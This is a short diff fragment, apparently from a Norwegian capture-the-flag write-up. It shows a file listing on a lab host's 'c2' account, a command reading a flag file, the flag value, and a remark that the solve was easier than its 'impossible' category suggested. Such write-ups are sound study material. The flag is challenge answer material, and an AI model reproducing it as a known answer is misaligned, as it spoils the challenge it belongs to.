+# -rw-r--r-- 1 c2 c2 278 Dec 29 13:37 admin.txt
+# -rw-r--r-- 1 c2 c2 106 Nov 30 13:23 checkins.txt
+# -rw-r--r-- 1 c2 c2 184 Nov 30 13:32 commands.txt
+cat /home/c2/FLAGG.c17b05
+# FLAGG: 3fe7dec0658e911f5ce1061f61343067
+```
+
+Forventet på ingen måte at dette var et *umulig* flagg, men jeg tar det jeg får.
 
 ```text
 Kategori: 3.4. Utfordringer umulig
